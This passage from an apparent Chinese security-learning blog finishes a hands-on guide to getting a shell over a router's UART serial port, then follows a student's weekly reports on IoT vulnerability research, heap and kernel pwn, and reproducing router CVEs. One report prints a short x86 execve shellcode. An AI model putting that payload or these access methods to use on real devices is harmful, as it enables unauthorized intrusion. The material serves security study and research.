title="GND"></a>GND</h3><p>介绍：GND是电线接地端的简写，代表地线或0线。这个地并不是真正意义上的地，是出于应用而假设的一个地，对于电源来说，它就是一个电源的负极</p><p>识别：拔下设备的电源，将万用表扭到蜂鸣裆，黑色探针接触板卡上的金属，红色探针依次与四个口触碰，当听到万用表发出”bi<del>bi”或者”di</del>di”（或者其他声音）的声音就是GND</p><h3 id="VCC"><a href="#VCC" class="headerlink" title="VCC"></a>VCC</h3><p>介绍：<code>C=circuit </code>表示电路的意思，即接入电路的电压</p><p>识别：插上设备的电源，将万用表扭到20v，黑色探针接到刚刚测出来的GND，红色探针去触碰剩下的三个口，直到有测到有个口的电压为3.3V或者5V，就是VCC</p><h3 id="TX（transmission-of-data）"><a href="#TX（transmission-of-data）" class="headerlink" title="TX（transmission of data）"></a>TX（transmission of data）</h3><p>介绍：发送数据</p><p>识别：插上设备的电源，将万用表扭到20v，在路由器启动的一段时间中，用黑色探针接到GND，分别红色探针去触碰剩下的俩个口，电压变化较大的即为TX</p><h3 id="RX（receiving-of-data）"><a href="#RX（receiving-of-data）" class="headerlink" title="RX（receiving of data）"></a>RX（receiving of data）</h3><p>介绍：接收数据</p><p>识别：识别完上面的接口，剩下的就是咯！</p><p>找到接口之后，就可以拿杜邦线来连接UART，买了下面的阵脚和TTL转USB，为什么要用FT232呢？因为电脑没有转化电平信号的硬件，下图是淘宝买的FT232：</p><img src="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/3.jpg" class=""><p>需要注意的是RX和TX与FT232上的RX和TX反着接，就像下图一样，先不要焊排针上去，先不要焊排针上去！！！先用手定住测试一下，没问题了，再焊上去！</p><img src="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/5.png" class=""><p>连接完成之后就可以使用串口调试工具来获取一个shell，有好几个工具，都大差不差：</p><ul><li>putty<ul><li><a href="https://www.jianshu.com/p/774ef8359596">利用 Putty 的 Serial 功能来连线串口设备</a></li></ul></li><li>串口调试助手<ul><li><a href="https://blog.csdn.net/ddddd2223323/article/details/105615038/">WIN10上串口调试助手</a></li></ul></li><li>SecureCRT<ul><li><a href="https://www.jianshu.com/p/514e345d4d1c">SecureCRT使用指南</a></li></ul></li></ul><p>随便一个工具都可以连接，确定好COM口号，就可以使用指定的波特率来连接，这里波特率多试几个常见的就好，一般都可以试出来的</p><blockquote><p>查看COM口的方法：此电脑 =&gt; 管理 =&gt; 设备管理器 =&gt; 端口</p></blockquote><img src="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/6.png" class=""><p>等待加载完成，按下回车就进入shell的界面，泪目了，看到这个shell的激动程度不亚于用树莓派提取固件，一直尝试，一直不行，换了好几台设备，终于在这台CISCO上拿到了shell</p><img src="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/7.png" class=""><p>试过可以拿到shell的时候就可以焊上排针了，焊完之后就成了下面这个样子（老爸帮忙焊的，我在旁边看着真不错😀）：</p><img src="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/4.jpg" class=""><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在失败了这么多次之后，总结一下失败的经验：</p><ul><li><p>可能一：<code>RX</code>和<code>TX</code>线接错了</p><p>解决办法：由于根据其他大师傅的说法，在启动一段时间里面电压变化较大的为<code>TX</code>，但是两个接口都差不多，没办法确认是否接正确了（听说可以将旁边的 3.3 伏特的 15K 电阻器将 TX 拉高），只能换着接，还有就是注意TX和RX要反着接，具体看上面的图</p></li><li><p>可能二：焊接问题</p><p>解决办法：只能重新焊，多焊几次就熟悉了….，一般情况下焊上去就可以了，但也不排除焊坏的情况</p></li><li><p>可能三：波特率选错</p><p>解决办法：多试几次，因为测试的脚本根本不顶用…，拿常见的波特率先试，一般都能试到的</p></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/248900">NetGear 夜鹰TP-Link TL-WR940N RAX40V2 设备与固件分析</a></p><p><a href="https://x1ng.top/2020/12/06/%E5%AD%A6%E4%B9%A0%E6%8B%86%E6%9C%BA%E8%B0%83%E8%AF%95%E8%B7%AF%E7%94%B1%E5%99%A8/">学习拆机调试路由器</a></p><p><a href="https://paper.seebug.org/153/">HG533路由器分析系列教程之一：找到硬件调试接口</a></p><p><a href="https://www.freebuf.com/articles/endpoint/271414.html">通过设备UART接口调试获取shell</a></p><p><a href="https://www.freebuf.com/geek/163312.html">5分钟教程：如何通过UART获得root权限</a></p><p><a href="https://blog.senr.io/blog/cve-2017-9466-why-is-my-router-blinking-morse-code">CVE-2017-9466: Why Is My Router Blinking Morse Code?</a></p><p><a href="https://www.77169.net/html/149958.html">TP-Link WR841N路由器任意代码执行漏洞分析</a></p><p><a href="https://www.seebug.org/vuldb/ssvid-96260">systemd CVE-2017-9445 Out-Of-Bounds Write Remote Code Execution Vulnerability</a></p><p><a href="https://www.youtube.com/watch?v=ZmZuKA-Rst0">硬件逆向介绍：查找 UART 并获取shell</a></p><p><a href="https://oldwiki.archive.openwrt.org/toh/tp-link/tl-wr940n">TP-Link TL-WR940N</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周报！月报！年报！</title>
      <link href="/2021/11/17/%E5%91%A8%E6%8A%A5%EF%BC%81%E6%9C%88%E6%8A%A5%EF%BC%81%E5%B9%B4%E6%8A%A5%EF%BC%81/"/>
      <url>/2021/11/17/%E5%91%A8%E6%8A%A5%EF%BC%81%E6%9C%88%E6%8A%A5%EF%BC%81%E5%B9%B4%E6%8A%A5%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h1 id="二一年十月周报（一）"><a href="#二一年十月周报（一）" class="headerlink" title="二一年十月周报（一）"></a>二一年十月周报（一）</h1><blockquote><p>​        从这个月起，周末杂货铺正式开张！由于落后的太多需要跑的更快才能赶上别人，所以开始写周报计划一下，回顾上周学习过的知识以及接下来需要学习的知识，做周报真滴可以提升学习的效率，同时做周报也是件挺快乐的一件事（<code>×</code>水文章</p></blockquote><h3 id="上周学习回顾："><a href="#上周学习回顾：" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>复习<code>SROP+orw</code>的基本操作与手法，之前对<code>SROP</code>还有点懵懵懂懂，一直搞不清楚它到底是怎么样劫持控制流的，其实就是在栈上的对应的<code>RIP</code>寄存器上写上要跳转的地方即可（当时可能太浮躁没太注意….</li><li>一直以来都对<code>tache bin attack</code>很恐慌，觉得<code>tache</code>这个新奇玩意有点奇怪，但真正静下心来看看它的攻击手法之后并没有这么的困难</li><li>同样也是对<code>IO_FILE</code>复杂的结构给吓到了，这周终于把它给搞定了！从头到尾都看了看分析了一下，对<code>IO_FILE</code>泄露地址也懂为啥<code>payload</code>要那样写了！</li><li>做了一下串口拿<code>shell</code>的实验，但是并没有成功，原因不详  ㄒoㄒ！！！</li></ul><p>get到的小tips：</p><ul><li><p>保护全开如何查看<code>.bss</code>段内容：<code>vmmap</code>看基地址加上<code>ida</code>里面的偏移即可</p></li><li><p>注意<code>ebp</code>存放的值有可能是一条汇编代码，在PWN溢出的时候，如果打不通，就注意要复原（一般都可以泄露）</p></li><li><p>发现<a href="https://elixir.bootlin.com/linux/latest/source">linux内核源码阅读</a>的网址，啥版本都有，有点牛！</p></li><li><p>x86位很短的shellcode  :lens ==&gt; 22</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80</span><br></pre></td></tr></table></figure><p>———-<em>上周计划是否完成：完成程度不错</em></p></li></ul><h3 id="下周学习计划"><a href="#下周学习计划" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统的知识</li><li>加深对<code>IO_FILE</code>的理解</li><li>尝试在<code>telnet</code>里面打包文件系统</li><li>有时间建议复现一个CVE（qemu模拟或者是WR-TL841N（它到了的话））</li><li>阅读《庖丁解牛linux内核》尝试调试内核代码</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这周的学习进度又慢了下来，就不知道学啥了，还是多打点比赛，以赛代练，在比赛中查缺补漏，就好像在鹤城中，有题真就白给题居然没做出来….还得再静下心来，加快点脚步才行！</p><h1 id="二一年十月周报（二）"><a href="#二一年十月周报（二）" class="headerlink" title="二一年十月周报（二）"></a>二一年十月周报（二）</h1><h3 id="上周学习回顾：-1"><a href="#上周学习回顾：-1" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>调试<code>linux</code>内核了解<code>linux</code>内核启动过程</li><li>加深对IO_FILE的认知</li><li>复现了TP-LINK WR-TL841N的CVE-2020-8423（模拟的方法）</li><li>拆卸WR-TL841N焊接（焊接是个精细活）上排针进行串口拿<code>shell</code>，还是没有成功….救命…</li></ul><p>get到的小tips：</p><ul><li><p>通过<code>grep</code>字符串查看<code>libc</code>的方法</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-1"><a href="#下周学习计划-1" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统的知识</li><li>尝试在<code>telnet</code>里面打包文件系统（上周并未完成）</li><li>接着复现TP-LINK WR-TL841N</li><li>学习<code>python</code>的<code>scoket</code>编程，熟悉一些网络编程的库函数</li><li>完成<code>start_kernel</code>的调试，并解决完提出的问题</li><li>尝试拿到<code>kernel pwn</code>来练练手，加深对内核的理解</li></ul><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这周可能是任务太过难，内核不愧是内核，导致学习的进度赶不上去，不过至少还是学习到了一些内核和操作系统的知识，在复现WR-TL841N不论是在模拟和真机上都碰到不少问题，最恐怖的是真机上，它的固件特别奇怪，有可能是国内和国外的版本不一样，下周继续尝试，串口拿shell的问题还没排查，大致如下：</p><p>可能一：RX和TX线接错了</p><p>解决办法：由于根据其他大师傅的说法，在启动一段时间里面电压变化较大的为<code>TX</code>，但是两个接口都差不多，没办法确认是否接正确了（听说可以将旁边的 3.3 伏特的 15K 电阻器将 TX 拉高），只能换着接</p><p>可能二：焊接问题</p><p>解决办法：只能重新焊，多焊几次就熟悉了….</p><p>可能三：波特率选错</p><p>解决办法：多试几次，因为测试的脚本根本不顶用…</p><p>再拿不到shell就去买小米的那个路由器吧，最后希望广东省强网能进线下吧😔</p><h1 id="二一年十月周报（三）"><a href="#二一年十月周报（三）" class="headerlink" title="二一年十月周报（三）"></a>二一年十月周报（三）</h1><h3 id="上周学习回顾：-2"><a href="#上周学习回顾：-2" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>调试完成linux内核的启动过程，写完《和kernel说个Hello吧！（一）》</li><li>尝试<code>kernel pwn</code>中的<code>ret2user</code></li><li>学了四天的<code>realloc</code>（可能菜狗就是我吧！），才整出一篇文章</li></ul><p>get到的小tips：</p><ul><li><p>man手册真的是个好东西</p></li><li><p><code>%a</code>格式化字符的另一种泄露方法</p><p>———-<em>上周计划是否完成：完成程度较差</em></p></li></ul><h3 id="下周学习计划-2"><a href="#下周学习计划-2" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统中的分页（优先级：3）</li><li>尝试在telnet里面打包文件系统（上周又未完成）（优先级：5）</li><li>接着复现TP-LINK WR-TL841N（上周未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>整理这段时间所学习过的堆利用（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>这周只能说为什么完整的理解<code>girlfriend</code>的<code>realloc</code>花了挺多时间来整理的，感觉效率低了一点，一个知识点学4天….，在下周的计划中首次加入任务优先级！为了更高效的完成任务！下周还有个支线任务是漏洞银行的PPT要做，希望能做块一点吧呜呜呜….</p><h1 id="二一年十月周报（四）"><a href="#二一年十月周报（四）" class="headerlink" title="二一年十月周报（四）"></a>二一年十月周报（四）</h1><h3 id="上周学习回顾：-3"><a href="#上周学习回顾：-3" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>复现完TP-LINK WR-TL841N，还有点未收尾</li><li>尝试<code>kernel pwn</code>中的<code>ret2user</code>，但是没写完</li><li>整理完最近学习的堆利用</li></ul><p>get到的小tips：</p><ul><li><p>暴力覆盖使得<code>put</code>的时候没有<code>&quot;\x00&quot;</code>泄露<code>libc</code></p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-3"><a href="#下周学习计划-3" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些linux操作系统中的分页（优先级：5）</li><li>看看TP-LINK WR-TL841N还有啥要补充的，接着补充完（优先级：2）</li><li>尝试在telnet里面打包文件系统（上周又又未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：3）</li><li>尝试挖掘路由器的漏洞（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>有个小喜事—-进入了<code>chaMD5</code>团队的IOT小队，认识了一些大哥，也能交流交流了….准备买点设备挖点洞了，选择了一个小厂的企业级路由器来玩，飘了，复现了俩三个洞就敢挑战真实的挖洞了，希望能有个好开端，冲！！！这周学习的进度还是没赶上去</p><p>原因一：</p><p>是要做讲课的PPT</p><p>原因二：</p><p>是qemu模拟太麻了，怎么会这么麻，加油吧！</p><h1 id="十月月报"><a href="#十月月报" class="headerlink" title="十月月报"></a>十月月报</h1><blockquote><p>十月很快就过去了，所以月报也就来了</p></blockquote><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>很快一个月就过去了，这一个月以来学习的东西还是比较充分的，整体的路线没有偏离原来的方向，主线还是在IOT的漏洞挖掘上，在复现了几个路由器的漏洞之后，定下一个小目标，这学期挖出漏洞，不管是难的易的，不管是否为目前已存在的CVE或者CNVD编号的漏洞，不管是<code>web</code>的洞还是二进制的洞，只要是洞并且整个流程都是自己独立分析，<code>exp</code>也是自己独立编写的就算目标完成！希望能够完成吧！留给自己努力的时间不多了…回看这个月，有喜事也有让自己很不开心的事，虽然很多时候真的有点难受，但还是不能停下前进的脚步</p><h4 id="小喜事"><a href="#小喜事" class="headerlink" title="小喜事"></a>小喜事</h4><ul><li><p>成功在安全客发布文章</p></li><li><p>加入chamd5团队</p></li><li><p>受邀参加漏洞银行的大咖讲课</p></li><li><p>学习进度还算稳扎稳打</p></li></ul><h4 id="小难受"><a href="#小难受" class="headerlink" title="小难受"></a>小难受</h4><ul><li>还是没有进入线下赛，也不怪队友啥的，就是自己菜，菜是原罪，不能一打四也是菜，但不能受打击啊！继续努力吧….</li></ul><h4 id="小目标"><a href="#小目标" class="headerlink" title="小目标"></a>小目标</h4><p>在此学期内成功挖掘出漏洞！！！</p><h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>没什么好说了，冲！</p><h1 id="二一年十一月周报（一）"><a href="#二一年十一月周报（一）" class="headerlink" title="二一年十一月周报（一）"></a>二一年十一月周报（一）</h1><h3 id="上周学习回顾：-4"><a href="#上周学习回顾：-4" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>完成DVRF靶场的题目，熟悉MIPS的ROP链的构造</li><li>补充TP-LINK WR-TL841N</li><li>尝试挖掘UTT的漏洞</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度差</em></p></li></ul><h3 id="下周学习计划-4"><a href="#下周学习计划-4" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统中的分页（优先级：5）</li><li>看看TP-LINK WR-TL841N还有啥要补充的，接着补充完（优先级：2）</li><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：3）</li><li>尝试通过烧录夹获取固件（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>真的飘，尝试挖掘UTT的漏洞，发现根本挖不来，不过看到了文件系统里面存在<code>telnet</code>的程序，但是扫描的时候并没有发现<code>telnet</code>服务开启，所以尝试开启它看看有没弱口令挖挖，还是得多复现点漏洞才能在碰到真实的设备的时候有更多的思路，总的来说，由于讲课的缘故，也耗费了不少时间，但也是一次总结知识的机会。</p><h1 id="二一年十一月周报（二）"><a href="#二一年十一月周报（二）" class="headerlink" title="二一年十一月周报（二）"></a>二一年十一月周报（二）</h1><h3 id="上周学习回顾：-5"><a href="#上周学习回顾：-5" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>完成DVRF靶场的题目，熟悉MIPS的ROP链的构造</li><li>补充完TP-LINK WR-TL841N，虽然最后因为环境的问题没有成功打出反弹<code>shell</code>，但此漏洞的所要学习的知识点算是到位了</li><li>尝试挖掘UTT的漏洞</li><li>成功通过烧录夹获取固件</li><li>复现CISCO RV340的命令注入漏洞，再次熟悉一下命令注入以及<code>burpsuite</code>的使用</li></ul><p>get到的小tips：</p><ul><li><p>MIPS当中无效指令填充有些情况下真的很重要！！！</p><ul><li>为了避免指令缓存的情况出现，尽量填充点无效指令</li><li>为了做字符逃逸的shellcode</li></ul></li><li><p>虚拟机传递文件的时候出错去压缩一下就能传了</p><p>———-<em>上周计划是否完成：完成程度不错</em></p></li></ul><h3 id="下周学习计划-5"><a href="#下周学习计划-5" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统中的分页（优先级：5）</li><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：3）</li><li>挖掘TP-Link的漏洞，它俩的固件似乎和外网上的固件不太一样（优先级：2）</li><li>通过烧录夹获取固件两个TP-Link的固件（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>看到一篇文章后，再仔细思考了一下内卷的意义，得出两个结论，要想避免内卷有两种方法，一是选择一个比较不卷的方向，二是找到自己的优势区域，目前还没发现自己的优势区域，所以就先走IOT这条稍微没这么卷的路吧！但二者都有个共同点，还是努力，并且积极的去吸取前辈所积累下来的成果，并带着这些成果继续前进，但这里的努力也就脱离了内卷的本质，感触还是挺深的，这周又试了试UTT，找到了一个命令注入，以为可以利用，但其实不然，只能本地玩玩….这玩意的代码写的真的难以言喻</p><h1 id="二一年十一月周报（三）"><a href="#二一年十一月周报（三）" class="headerlink" title="二一年十一月周报（三）"></a>二一年十一月周报（三）</h1><h3 id="上周学习回顾：-6"><a href="#上周学习回顾：-6" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>完成DVRF靶场的题目，熟悉MIPS的ROP链的构造</li><li>补充完TP-LINK WR-TL841N，虽然最后因为环境的问题没有成功打出反弹<code>shell</code>，但此漏洞的所要学习的知识点算是到位了</li><li>尝试挖掘UTT的漏洞</li><li>成功通过烧录夹获取固件</li><li>复现CISCO RV340的命令注入漏洞，再次熟悉一下命令注入以及<code>burpsuite</code>的使用</li></ul><p>get到的小tips：</p><ul><li><p>有时候IDA和Ghidra可能反编译的代码不太一样，可以对照看看，没准会发现新大陆喔！</p><ul><li>原因不详~</li></ul></li><li><p>有时候拿不准是否存在漏洞的时候，写个demo！！！</p><p>———-<em>上周计划是否完成：完成程度不错</em></p></li></ul><h3 id="下周学习计划-6"><a href="#下周学习计划-6" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统中的分页（优先级：5）</li><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：3）</li><li>挖掘TP-Link的漏洞，它俩的固件似乎和外网上的固件不太一样（优先级：2）</li><li>通过烧录夹获取固件两个TP-Link的固件（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>新买了烧录夹，发现还是读取不到，不是夹子不好用，在UTT上一夹就上，真不错，但是TP-link夹半天不行，怕又给夹子夹坏了，就没夹了，估摸着不是夹子问题了这会，回去看了看UTT的洞，害！！！太兴奋了，没看清，那个洞完全没有利用的可能性…. </p><h1 id="二一年十一月周报（四）"><a href="#二一年十一月周报（四）" class="headerlink" title="二一年十一月周报（四）"></a>二一年十一月周报（四）</h1><h3 id="上周学习回顾：-7"><a href="#上周学习回顾：-7" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>分析DIR-859的CVE-2019–20215漏洞</li><li>提取TP-LINK的固件（失败）</li><li>连接TP-LINK的UART串口（失败）</li></ul><p>get到的小tips：</p><ul><li><p>在做kernel pwn的时候，没开-monitor参数的可以尝试qemu逃逸</p></li><li><p>连接串口的时候先不要焊接，先用手扶着看看是不是能成功连上再焊</p><p>———-<em>上周计划是否完成：完成程度差</em></p></li></ul><h3 id="下周学习计划-7"><a href="#下周学习计划-7" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又未完成）（优先级：3）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>复现DIR-859的两个漏洞（真实设备）（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3><p>这周终于弄完漏洞银行的演讲，不管讲的如何，至少顺顺利利的完成了，接下来就安心下来好好搞自己的事情了，又买了个路由器来复现DIR-859，希望能学到更多有用的东西，知道如何去构造数据包，给漏洞挖掘提供更多的思路，这次复现完<code>upnp</code>相关的内容之后，可以去看看思考的那个<code>upnp</code>的漏洞了，这玩意最近老爆漏洞，复现多了，没准我也能挖一个（希望如此哈哈哈）！</p><h1 id="十一月月报"><a href="#十一月月报" class="headerlink" title="十一月月报"></a>十一月月报</h1><blockquote><p>十一月也来了，这个月说学的多吧，也不多，只是有了一些新的想法和成果罢了</p></blockquote><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>距离一学期之约也快到了，能不能完成就看这个月了，加油！</p><h4 id="小喜事-1"><a href="#小喜事-1" class="headerlink" title="小喜事"></a>小喜事</h4><ul><li>成功在跳跳糖发布文章</li><li>西湖论剑可能被大哥带进线下</li><li>完成漏洞银行的大咖讲课</li><li>学习进度还算稳扎稳打，漏洞挖掘有了一点眉目了，在构造设备的exp</li></ul><h4 id="小难受-1"><a href="#小难受-1" class="headerlink" title="小难受"></a>小难受</h4><ul><li>挖不到漏洞啊….</li><li>情绪很不稳定</li></ul><h4 id="小目标-1"><a href="#小目标-1" class="headerlink" title="小目标"></a>小目标</h4><p>在此学期内成功挖掘出漏洞！！！，还是这个目标就看能不能完成了，就剩下一个月了</p><h4 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h4><p>挖不出？原因呢？仔细想想原因有以下几点：</p><p>一，对于漏洞点的敏感程度不高，有可能看见漏洞审了一下好像没啥毛病</p><p>二，对设备的攻击面不好把握，虽然知道一些攻击面，但是没有匹配到真实的设备上去，导致有点手忙脚乱</p><p>三，有点浮躁，有时候挖的时候就简单的看看有没危险函数，这样不行，要去慢慢理清他的业务逻辑</p><p>四，非自身原因：洞越挖越少，僧多粥少，这不能怪谁，就是自己没能力</p><p>解决的办法很简单，也是三点：</p><p>一，多复现</p><p>二，多总结</p><p>三，多耐心</p><p>目前的学习路线：</p><ul><li><p>觉得IOT的漏洞挖掘还是得对IOT的一些协议得明白的更多一些</p><ul><li><p>MQTT ==&gt; Toto link</p></li><li><p>UPNP ==&gt; CISCO 0day</p></li><li><p>Bluetooth ==&gt; BLE_CTF    （✔）</p></li></ul></li><li><p>一个设备的启动过程以及程序与程序之间的业务是如何传递信息的</p><ul><li>系统层面的知识：分时操作系统和实时操作系统</li><li>操作系统内核</li><li>U-boot</li></ul></li><li><p>调试接口的使用</p><ul><li>JTAG</li><li>UART    （✔）</li><li>SWD</li></ul></li><li><p>嵌入式webserver</p><ul><li>lighttpd</li><li>GoAhead</li></ul></li><li><p>web方面的漏洞</p></li></ul><h1 id="二一年十二月周报（一）"><a href="#二一年十二月周报（一）" class="headerlink" title="二一年十二月周报（一）"></a>二一年十二月周报（一）</h1><h3 id="上周学习回顾：-8"><a href="#上周学习回顾：-8" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>成功自己编写DIR-859的CVE-2019–20215漏洞的exp并打通（真机，系统级模拟，用户态模拟都试了，这波大满贯）</li><li>复习socket编程</li><li>重新回顾HWS的课程，写写总结</li></ul><p>get到的小tips：</p><ul><li><p>底座很重要，明白底座是什么，更好的确定它的攻击方式</p><ul><li>底座指的是设备使用的操作系统是什么？文件系统呢？通信模型呢？</li></ul><p>———-<em>上周计划是否完成：完成程度不错</em></p></li></ul><h3 id="下周学习计划-8"><a href="#下周学习计划-8" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又又又未完成，救命啊求你快完成吧…）（优先级：3）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>复现DIR-859的一个漏洞（真实设备），并尝试挖掘（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h3><p>回顾轩哥讲的HWS，还是收获到不少东西，同个东西在不同的时期看还是感觉不太一样的，这周也自己去完整的写出exp了，大概能明白构造包怎么去构造了，同时也看了看socket，感觉学的不够深，或许西湖论剑进决赛了，希望吧，虽然说基本上稳了，但是名单没有出来之前还是不放心，没准能去薅点设备和见识见识，现在慢慢感觉到一段时间没有产出或者说暂时有个小瓶颈也没什么关系，只要多积累，保持好心态，总会有井喷的一天，机会是留给有准备的人的，打打鸡血，继续上路追梦吧！</p><h1 id="二一年十二月周报（二）"><a href="#二一年十二月周报（二）" class="headerlink" title="二一年十二月周报（二）"></a>二一年十二月周报（二）</h1><h3 id="上周学习回顾：-9"><a href="#上周学习回顾：-9" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>复现DIR-859的一个漏洞（真实设备），并尝试挖掘（未成功）</li><li>梳理攻击路径相关内容</li><li>思考webserver的攻击</li><li>重新回顾HWS的课程，写写总结</li></ul><p>get到的小tips：</p><ul><li><p>ld_preload的64位和32位是不能相互加载的，只能ld_preload本机位数的libc</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-9"><a href="#下周学习计划-9" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h3><p>挖掘方面只能边走边看，边复现边思考，最近挖不动了，下周打算补充一些基础知识，做一些其他的研究，再回来看看有没有新思路，发现在我目前的知识网中还是有很多东西是空缺的，虽说知识是张网，从哪里学都一样，但还是要即使的意识到自己知识网中有什么缺陷，并及时的加入到学习计划中去执行。</p><h1 id="二一年十二月周报（三）"><a href="#二一年十二月周报（三）" class="headerlink" title="二一年十二月周报（三）"></a>二一年十二月周报（三）</h1><h3 id="上周学习回顾：-10"><a href="#上周学习回顾：-10" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>成功通过UART拿到shell</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度差</em></p></li></ul><h3 id="下周学习计划-10"><a href="#下周学习计划-10" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-12"><a href="#总结-12" class="headerlink" 